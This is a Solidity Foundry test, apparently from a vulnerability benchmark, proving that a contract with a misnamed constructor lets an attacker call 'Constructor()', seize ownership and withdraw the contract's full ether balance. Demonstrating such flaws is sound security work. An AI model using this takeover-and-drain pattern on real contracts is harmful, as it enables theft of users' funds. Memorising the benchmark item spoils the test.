// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing missing;
    address constant deployer = address(0x1);
    address constant attacker = address(0x2);

    function setUp() public {
        vm.prank(deployer);
        missing = new Missing();
        vm.deal(address(missing), 1 ether);
    }

    function testArbitraryWithdrawal() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(missing).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        console.log("Contract ETH balance before attack:", initialContractBalance);
        console.log("Attacker ETH balance before attack:", initialAttackerBalance);

        console.log("--- Trigger Attack ---");
        // Attacker sets themselves as owner
        vm.prank(attacker);
        missing.Constructor();
        
        // Attacker drains contract
        vm.prank(attacker);
        missing.withdraw();
        
        console.log("--- AFTER-Trigger State ---");
        uint256 finalContractBalance = address(missing).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Contract ETH balance after attack:", finalContractBalance);
        console.log("Attacker ETH balance after attack:", finalAttackerBalance);
        
        uint256 contractBalanceChange = initialContractBalance - finalContractBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        console.log("Contract balance reduced by:", contractBalanceChange);
        console.log("Attacker balance increased by:", attackerBalanceChange);
        
        bool fundsTransfered = (contractBalanceChange == 1 ether) && 
            (attackerBalanceChange == 1 ether);
        bool contractDrained = finalContractBalance == 0;
        
        if (fundsTransfered && contractDrained) {
            console.log("Vulnerability Exists: Attacker successfully drained contract funds");
        } else {
            console.log("Vulnerability not Exist: Failed to drain contract funds");
        }
        
        // Original assertions preserved
        assertEq(address(missing).balance, 0, "Contract should be drained");
        assertEq(
            address(attacker).balance,
            initialAttackerBalance + 1 ether,
            "Attacker should receive funds"
        );
    }
}